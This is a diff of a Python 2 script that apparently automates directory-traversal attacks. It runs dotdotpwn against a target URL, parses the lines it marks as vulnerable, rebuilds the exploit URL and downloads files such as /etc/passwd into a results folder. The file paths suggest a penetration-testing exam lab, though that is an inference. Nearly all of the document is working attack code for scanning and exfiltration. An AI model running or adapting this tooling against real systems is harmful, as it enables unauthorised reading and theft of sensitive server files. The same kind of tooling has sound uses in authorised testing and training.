@@ -43,12 +43,13 @@ def dotPwn(URL):
 #	-C	Continue if no data was received from host
     port, resultsOut, baseURL, URL = parseURL(URL)
     konfirmString = setDotPwnOptions()
+    print "INFO: Starting Dotdotpwn"
     if ("TRAVERSAL" in URL):
-        DOTPWN = 'dotdotpwn.pl -m http-url -u %s -k %s -d %s -o %s -x %s -t 1 -q -C' % (URL, konfirmString, args.depth, args.os, port)
-        DOTPWNE = 'dotdotpwn.pl -m http-url -u %s -k %s -d %s -o %s -x %s -t 1 -e %s -q -C' % (URL, konfirmString, args.depth, args.os, port, args.extensions)
+        DOTPWN = 'dotdotpwn.pl -m http-url -u %s -k %s -d %s -o %s -x %s -t 1 -q -C -b' % (URL, konfirmString, args.depth, args.os, port)
+        DOTPWNE = 'dotdotpwn.pl -m http-url -u %s -k %s -d %s -o %s -x %s -t 1 -e %s -q -C -b' % (URL, konfirmString, args.depth, args.os, port, args.extensions)
     else:
-        DOTPWN = 'dotdotpwn.pl -m http -h %s -k %s -d %s -o %s -x %s -t 1 -q -C' % (baseURL, konfirmString, args.depth, args.os, port)
-        DOTPWNE = 'dotdotpwn.pl -m http -h %s -k %s -d %s -o %s -x %s -t 1 -e %s -q -C' % (baseURL, konfirmString, args.depth, args.os, port, args.extensions)
+        DOTPWN = 'dotdotpwn.pl -m http -h %s -k %s -d %s -o %s -x %s -t 1 -q -C -b' % (baseURL, konfirmString, args.depth, args.os, port)
+        DOTPWNE = 'dotdotpwn.pl -m http -h %s -k %s -d %s -o %s -x %s -t 1 -e %s -q -C -b' % (baseURL, konfirmString, args.depth, args.os, port, args.extensions)
     try:
         DOTPWNRESULTS = subprocess.check_output(DOTPWN, shell=True)      
     except CalledProcessError as ex:
@@ -69,29 +70,30 @@ def dotPwn(URL):
                 outFileWriter.close()
             except:
                 raise
-    try:
-        DOTPWNERESULTS = subprocess.check_output(DOTPWNE, shell=True)       
-    except CalledProcessError as fx: 
-        writeOutputFile = True 
-        textE = fx.output.split("\n")
-        for line in textE:
-            if ("[+] Total Traversals found: 0" == line):
-                print "INFO: No traversals found for %s" % URL
-                writeOutputFile = False
-            if ("<- VULNERABLE" in line):
-                vuln.append(line)        
-        if (writeOutputFile):    
-            try:
-                outfile = "/root/scripts/recon_enum/results/exam/dotdotpwn/E%s" % resultsOut
-                print "INFO: Traversals found using extensions! See %s" % outfile
-                outFileWriter = open(outfile, "w")
-                outFileWriter.write(fx.output)
-                outFileWriter.close()
-            except:
-                raise
-    if (args.scan_and_retrieve):
-        if (len(vuln) > 0):
-            retrieve()
+    if (len(vuln) == 0): #don't run extension scan if we already have a vuln
+        try:
+            DOTPWNERESULTS = subprocess.check_output(DOTPWNE, shell=True)       
+        except CalledProcessError as fx: 
+            writeOutputFile = True 
+            textE = fx.output.split("\n")
+            for line in textE:
+                if ("[+] Total Traversals found: 0" == line):
+                    print "INFO: No traversals found for %s using file extensions" % URL
+                    writeOutputFile = False
+                if ("<- VULNERABLE" in line):
+                    vuln.append(line)        
+            if (writeOutputFile):    
+                try:
+                    outfile = "/root/scripts/recon_enum/results/exam/dotdotpwn/E%s" % resultsOut
+                    print "INFO: Traversals found using extensions! See %s" % outfile
+                    outFileWriter = open(outfile, "w")
+                    outFileWriter.write(fx.output)
+                    outFileWriter.close()
+                except:
+                    raise
+    if (args.scan_and_retrieve and len(vuln) > 0):
+        print "INFO: Downloading files"
+        retrieve()
     
 #grab pieces to build URL, feed in files to grab,     
 def retrieve():
@@ -114,7 +116,9 @@ def retrieve():
             xfiltmp = xfil.replace("/", "_") #for outputFile
             vulnBasetmp = vulnBase.replace("/", "_") #for outputFile
             xfil = xfil.replace("/", encodedSplit)
-            fullURL = vulnProto + vulnBase + vulnPage + vulnStringPrefix + xfil + vulnStringSuffix
+            #2x vulnStringPrefix due to a parsing bug. Additional shouldn't hurt....
+            fullURL = vulnProto + vulnBase + vulnPage + vulnStringPrefix + vulnStringPrefix + xfil + vulnStringSuffix
+            #print "DEBUG: %s" % fullURL
             fileContents, status_code = grabFileFromURL(fullURL)
             if (status_code == 200):
                 outputFile = "/root/scripts/recon_enum/results/exam/dotdotpwn/%s_%s" % (vulnBasetmp, xfiltmp)
@@ -123,6 +127,7 @@ def retrieve():
                     output.write(fileContents)
                     output.close()
                 except UnicodeEncodeError:
+                    #print "WARNING: Unicode errors. Forcing ascii, xmlcharrefreplace"
                     output = open(outputFile, 'w+')
                     fileContents = fileContents.encode('ascii','xmlcharrefreplace')
                     output.write(fileContents)
@@ -131,6 +136,7 @@ def retrieve():
                     raise
     except:
         raise
+    sortRetrievedFiles()
     print "INFO: Downloading of files complete"
 
 def grabFileFromURL(url):
@@ -138,6 +144,8 @@ def grabFileFromURL(url):
         r = requests.get(url)
         if (r.status_code == 200):
             return r.text, r.status_code
+        else:
+            return False, r.status_code
     except:
         raise
 
@@ -158,13 +166,13 @@ def sortRetrievedFiles():
         try:
             os.makedirs(str(sizeOfitems))
         except:
-            print "Warning: Dir already exists"
+            continue
+            #print "Warning: Dir already exists"
         for items in files:
             if os.path.getsize(items) == sizeOfitems:
                 newpath = "./%s/%s" % (str(sizeOfitems),items)
                 os.rename(items,newpath)
                 files.remove(items)
-        
 
 ##1, grab port
 ##2, output file cannot have "/" in filename
@@ -201,10 +209,11 @@ def setDotPwnOptions():
         konfirmString = '"[fonts]"'
     return konfirmString
     
-def analyzeVuln(vulnar):
+
 #will return values to build a string like base+page+pre+path+encodedsplit+userrequestfile+suffix
 #let base = IP:Port/
 #let vulnPage = page.ext[/|=]
+def analyzeVuln(vulnar):
     final = []
     for vuln in vulnar:
         vulnProto = ""
@@ -214,7 +223,7 @@ def analyzeVuln(vulnar):
         vulnStringPrefix = ""
         vulnStringSuffix = ""
         encodedSplit = ""
-        tmp = vuln[17:len(vuln)-14]
+        tmp = vuln[17:len(vuln)-14] #vuln is entire line from [*] testing url... to <- VULNERABLE
         vulnURL.append(tmp)
         if ("http://" in tmp):
             vulnProto = "http://"
@@ -225,14 +234,18 @@ def analyzeVuln(vulnar):
         vulnPagetmp = vulnBase.split("/",1)[1]
         vulnBase = vulnBase.split("/",1)[0]       
         vulnBase = vulnBase + "/"
+        #print "DEBUG: vulnBase %s" % vulnBase
+        #print "DEBUG: vulnPagetmp: %s" % vulnPagetmp
         if ("=" in vulnPagetmp): #vulnPage with param, ie 'index.php?arg='
             vulnPage = vulnPagetmp.split("=",1)[0]
             vulnPage = vulnPage + "="
             vulnStringPrefixtmp = vulnPagetmp.split("=",1)[1]
-        else:                 #vulnPage with no param, ie /index.php/
-            vulnPage = vulnPagetmp.split("/",2)[1]
+        else:                 #vulnPage with no param, ie index.php/
+            vulnPage = vulnPagetmp.split("/",2)[0]
             vulnPage = vulnPage + "/"
-            vulnStringPrefixtmp = vulnPagetmp.split("/",2)[2]
+            #print "DEBUG: vulnPagetmpsplit %s" % vulnPagetmp.split("/",2)
+            vulnStringPrefixtmp = vulnPagetmp.split("/",2)[len(vulnPagetmp.split("/",2))-1]
+            #print "DEBUG: vulnStringPrefixtmp: %s" %vulnStringPrefixtmp
         if (args.os == 'unix'): #looking for passwd and issue, user specified file not available yet
             vulnStringPrefix = vulnStringPrefixtmp.split("etc")[0]  
             encodedSplittmp = vulnStringPrefixtmp.split("etc")[1]
@@ -254,6 +267,8 @@ def analyzeVuln(vulnar):
             print "Error: Windows not supported for file exfil yet"
             raise
         vals = vulnProto, vulnBase, vulnPage, vulnStringPrefix, vulnStringSuffix, encodedSplit
+        print "DEBUG: Make sure these values are correct: vulnProto, vulnBase, vulnPage, vulnStringPrefix, vulnStringSuffix, encodedSplit"
+        print vals
         final.append(vals)
     return final
     
